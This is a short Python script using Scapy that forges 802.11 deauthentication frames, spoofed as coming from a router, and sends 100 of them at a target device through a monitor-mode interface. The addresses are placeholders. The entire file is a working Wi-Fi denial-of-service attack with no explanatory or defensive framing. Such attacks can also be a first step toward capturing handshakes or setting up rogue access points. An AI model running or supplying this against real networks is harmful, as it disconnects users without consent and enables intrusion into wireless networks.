from scapy.all import *

def deauth(target_mac, router_mac):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=router_mac, addr3=router_mac) / Dot11Deauth()
    sendp(packet, iface="wlan0mon", count=100, inter=0.1, verbose=1)


target_mac = "00:11:22:33:44:55"
router_mac = "AA:BB:CC:DD:EE:FF"

deauth(target_mac, router_mac)
